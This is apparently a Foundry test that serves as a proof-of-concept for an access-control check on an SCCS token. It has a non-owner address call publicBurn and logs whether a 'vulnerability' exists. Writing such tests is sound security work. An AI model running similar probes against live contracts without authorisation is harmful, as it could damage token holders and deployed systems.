// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SCCS.sol";

contract SCCSAccessControlTest is Test {
    SCCS token;
    address admin = address(0x1);
    address hacker = address(0x2);

    function setUp() public {
        vm.prank(admin);
        token = new SCCS(); // Deploy token as admin (owner)
    }

    function testPublicBurnAccessControl() public {
        uint initialBal = token.balanceOf(admin);
        uint amountToBurn = initialBal / 2;

        // Transfer tokens from admin to hacker to enable burning
        vm.prank(admin);
        token.transfer(hacker, amountToBurn);

        // Pre-burn state
        console.log("--- BEFORE-Trigger Burn ---");
        uint hackerBalBefore = token.balanceOf(hacker);
        uint totalSupplyBefore = token.totalSupply();
        console.log("Hacker balance before burn: %d", hackerBalBefore);
        console.log("Total supply before burn: %d", totalSupplyBefore);

        console.log("--- Trigger Burn ---");
        bool burnSuccess;
        try this.executeBurnAsHacker(amountToBurn) {
            burnSuccess = true;
        } catch {
            burnSuccess = false;
        }
        if (burnSuccess) {
            console.log("Burn operation executed successfully");
        } else {
            console.log("Burn operation reverted");
        }

        console.log("--- AFTER-Trigger Burn ---");
        uint hackerBalAfter = token.balanceOf(hacker);
        uint totalSupplyAfter = token.totalSupply();
        console.log("Hacker balance after burn: %d", hackerBalAfter);
        console.log("Total supply after burn: %d", totalSupplyAfter);

        // Determine vulnerability existence
        if (burnSuccess && hackerBalAfter == 0 && totalSupplyAfter == totalSupplyBefore - amountToBurn) {
            console.log("Vulnerability Exists: Non-owner successfully burned tokens");
        } else if (!burnSuccess) {
            console.log("Vulnerability not Exist: Burn operation reverted");
        } else if (hackerBalAfter != 0) {
            console.log("Vulnerability not Exist: Hacker balance not reduced to 0");
        } else {
            console.log("Vulnerability not Exist: Total supply mismatch after burn");
        }
    }

    // Helper function to execute burn with proper context
    function executeBurnAsHacker(uint256 amount) external {
        vm.startPrank(hacker);
        token.publicBurn(amount);
        vm.stopPrank();
    }
}